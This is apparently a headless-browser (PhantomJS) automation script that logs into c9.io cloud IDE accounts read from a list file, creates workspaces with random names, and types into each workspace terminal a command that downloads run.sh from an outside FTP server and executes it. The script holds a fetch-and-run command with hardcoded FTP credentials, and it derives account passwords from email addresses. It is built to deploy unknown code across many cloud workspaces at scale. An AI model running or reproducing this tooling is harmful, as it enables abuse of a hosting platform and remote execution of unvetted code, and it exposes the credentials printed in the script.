//SET SLIMERJSLAUNCHER=C:\Documents and Settings\Admin\slimerjs\xulrunner\xulrunner
//Registration new workspase in i9 ide
var page = require("webpage").create();
var fs = require("fs");
var home_dir= fs.workingDirectory;
var second=st=0;
var circle=(fs.read("circle")).trim();

setTimeout(err_exit, 600000);//Extra EXIT
// I am
var ami = "i9run.js";//system.args[0];//code name
console.log("Phantomjs.^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^");
console.log("Phantomjs. Hello I am "+ami);
var report=ami+" ";
page.viewportSize = { width:1600, height:900 };


var ps="";
var p="";

//***************************
var user_for_prepare="";
var new_user_after_reg="";
var user_to_put_in_input_file_if_done="";
var input_file_name= "i9workspacelist";//file for input data
var output_file_name= "i9donelist";//file for done data, seccuced running
//***************************

if (!fs.isFile(input_file_name)){
		console.log("Phantomjs.ERROR. Can't finde "+input_file_name+" file"); 
		var err_index = String(Math.random()).slice(9);
		fs.write(err_index+".w", new Date()+"ERROR. Can't finde "+input_file_name+" file", 'w');
		exit();
}
else if (!fs.isFile(output_file_name)){
		console.log("Phantomjs.ERROR. Can't finde "+output_file_name+" file"); 
		var err_index = String(Math.random()).slice(9);
		fs.write(err_index+".w", new Date()+"ERROR. Can't finde "+output_file_name+" file", 'w');
		exit();
}
else {
	GetUserFromInputFile();
}

function GetUserFromInputFile(){
	// if we have own line - for read first line in the input file it was end with \n - LF simvol, otherwise we get empty user name 
	console.log("Phantomjs.Input_file_name= "+input_file_name);
	console.log("Phantomjs.Try to get new user");
	var stream = fs.open(input_file_name, 'r');
	console.log("Phantomjs.Get new user from file");
	var line = stream.read();
	//console.log("Phantomjs.line= " + line);
	user_for_prepare=line.substring(0,line.indexOf("\n"));// for read first line in the input file it was end with \n - LF simvol, otherwise we get empty user name
	user_to_put_in_input_file_if_done=line.substring(line.indexOf("\n")+1);
	//console.log("Phantomjs.user_to_put_in_input_file_if_done= "+user_to_put_in_input_file_if_done);
	user_for_prepare=user_for_prepare.trim();
	//---Get login data 
	ps=user_for_prepare.substring(0,user_for_prepare.indexOf(";"));
	p=ps.substring(0,ps.indexOf("@"))+"XXX)";
	user_to_put_in_input_file_if_done=user_to_put_in_input_file_if_done.trim();
	//console.log("Phantomjs.user_for_prepare= " + user_for_prepare);
	//console.log("Phantomjs.user_to_put_in_input_file_if_done= " + user_to_put_in_input_file_if_done);
	stream.close();
	if (user_for_prepare===""){
		console.log("Phantomjs.regwsi9 NO user_for_prepare EXIT");
		var err_index = String(Math.random()).slice(9);
		fs.write(err_index+".w", new Date()+"regwsi9 NO user_for_prepare EXIT", 'w');
		exit();
	} else {
		open_page();//<---- Try to reg user
	}
}

//---1
function open_page(){
 console.log("Phantomjs. Opennig page");
 page.settings.userAgent = 'Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) Safari/534.34';
 page.open("https://c9.io/login", function(status){
   if(status !== "success") {
			console.log("Phantomjs.Sorry, the page is not loaded");
			setTimeout(full_screen_exit, 20000);
			//exit();
		} else {
			console.log("Phantomjs. Page Opened");
			login();
	}
 })
}

//---2
function login(){
    console.log("Phantomjs.Login.");
	//Login
	var point = page.evaluate(function () {
		var element = document.getElementById('id-username');
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	page.sendEvent('keypress', ps);
	//Password
	var point = page.evaluate(function () {
		var element = document.getElementById('id-password');
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	page.sendEvent('keypress', p);
	//LB
	var point = page.evaluate(function () {
		var element = document.getElementsByClassName('wrap')[1];
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	setTimeout(newproject, 20000);
}

//---3
function newproject(){
    console.log("Phantomjs.newproject.");
	var point = page.evaluate(function () {
		var element = document.getElementById('card-new-project');
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	setTimeout(RegNewWorkSpase, 20000);
}

function getRandomName(minv,maxv,txt){
	//rndn=getRandomName(7,11,"") <--- call example
	
	//Thanks for Leon http://leapon.net/files/namegen.html
		
	//var maxv=5;//name lenght from 
	//var minv=9;//name lenght to
	//these weird character sets are intended to cope with the nature of English (e.g. char 'x' pops up less frequently than char 's')
	//note: 'h' appears as consonants and vocals
	var vocals = 'aeiouyh' + 'aeiou' + 'aeiou';
	var cons = 'bcdfghjklmnpqrstvwxz' + 'bcdfgjklmnprstvw' + 'bcdfgjklmnprst'+txt;
	var allchars = vocals + cons;
	var length = Math.floor(Math.random()*(maxv-minv)) + minv;
	if (length < 5) length = 5;
	//console.log("Phantomjs.name lenght = "+length);
	var consnum = 0;
	var name = "";
	for (var i = 0; i < length; i++){
		//if we have used 2 consonants, the next char must be vocal.
		if (consnum == 2){
			touse = vocals;
			consnum = 0;
		} else touse = allchars;
		//pick a random character from the set we are goin to use.
		c=touse.charAt(Math.floor(Math.random()*touse.length));
		//console.log("Phantomjs.c = "+c);
		name = name + c;
		if (cons.indexOf(c) != -1) consnum++;
	}
	return name;
}

function RegNewWorkSpase(){
	var rndn=getRandomName(7,11,"");
	user_for_prepare+=rndn;
	//console.log("Phantomjs.user_for_prepare="+user_for_prepare);
	console.log("Phantomjs.RegNewWorkSpase.");
	var point = page.evaluate(function () {
		var element = document.getElementsByName('name')[0];
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	page.sendEvent('keypress', rndn);
	var point = page.evaluate(function () {
		var element = document.getElementsByName('description')[0];
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	page.sendEvent('keypress', rndn);
	var point = page.evaluate(function () {
		var element = document.getElementById('ws-type-default');
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	var point = page.evaluate(function () {
		var element = document.getElementsByClassName('solid fat success animated bounceIn')[0];
		var rect = element.getBoundingClientRect();
			 return {
					 x: rect.left + Math.floor(rect.width / 2),
					y: rect.top + Math.floor(rect.height / 2)
			};
    });
	page.sendEvent('click', point.x, point.y);
	setTimeout(ChekCreate, 90000);
}

function ChekCreate(){
	console.log("Phantomjs.Cheking for creating workspase.");
	var chek="";
	chek=page.evaluate(function () {
			return document.getElementsByClassName('item cpu')[0].innerText;
    });
	console.log("Phantomjs.Chek="+chek);
	if (chek==="CPU"){
		console.log("Phantomjs.Work spase create.");
		setTimeout(click, 3000);
	}
	else{
		console.log("Phantomjs. WARNING!!! -  Regwsi 9 - Cant create workspase.");
		var err_index = String(Math.random()).slice(9);
		fs.write(err_index+".w", new Date()+"WARNING!!! -  Regwsi 9 - Cant create workspase.", 'w');
		full_screen_exit();
	}
}

function click(){
	page.sendEvent ("click", 1000, 835, button='left');
	setTimeout(runsh, 1000);
}
	
function runsh(){
	console.log("Phantomjs./run.sh");
	page.sendEvent('keypress', 'echo "'+user_for_prepare+'" > u.u; wget --user=alivant@inbox.ru --password=292949d8 ftp://node0.net2ftp.ru/js/run.sh; chmod 777 run.sh; ./run.sh\r');
	setTimeout(DoneRegUser, 3000);
}

function  DoneRegUser(){
	//change input_file
	console.log("Phantomjs.Rewrite input file");
	fs.write(input_file_name, user_to_put_in_input_file_if_done , 'w');
	//change output_file, add new user
	console.log("Phantomjs.Put new user to the output_file ");
	var stream = fs.open(output_file_name, 'r');
	var line = stream.read();
	new_user_after_reg=user_for_prepare;//
	line+=new_user_after_reg+"\n";
	//console.log("Phantomjs.new line ="+line);
	stream.close();
	fs.write(output_file_name,line , 'w');
	console.log("-------------------------------------------");
	console.log("Phantomjs.Prehaps all Good. Done. Thanks All");
	console.log("-------------------------------------------");
	full_screen_exit();
}


function full_screen_exit(){
	page.render("regwsi9.png");
	setTimeout(exit, 5000);
}

function err_exit(){
	  console.log("ERROR_EXIT!!!");
	warning_exit();
}

function warning_exit(){ 
	var err_index = String(Math.random()).slice(9);
	fs.write(err_index+".w", new Date()+" regwsi9.js   ERROR_EXIT!!!", 'w');
	full_screen_exit();
} 

function exit(){
 console.log("Phantomjs. Exit. Bye)");
 console.log("Phantomjs.--------------------------------");
 page.close();
 phantom.exit();
}



/* function click_for_restart(){
    console.log("Phantomjs.Click for restart.");
	var cpu=page.evaluate(function () {
		return document.getElementsByClassName('item cpu')[0].innerHTML;
		var lbx1x1x1 = document.getElementsByClassName('item cpu')[0].innerHTML;
		var lbx1x1x1 = document.createEvent("MouseEvents");
		lbx1x1x1.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		lbx1x1x1.dispatchEvent(lbx1x1x1);
     });
	 console.log("Phantomjs.cpu="+cpu);
	setTimeout(restart, 10000);
}

function restart(){
    console.log("Phantomjs.Restart.");
	page.evaluate(function () {
		var wwwww = document.getElementById('actionContainer').getElementsByClassName('caption')[1];
		var qqqqq = document.createEvent("MouseEvents");
		qqqqq.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		wwwww.dispatchEvent(qqqqq);
     });
	 
	setTimeout(full_screen_exit, 10000);
} */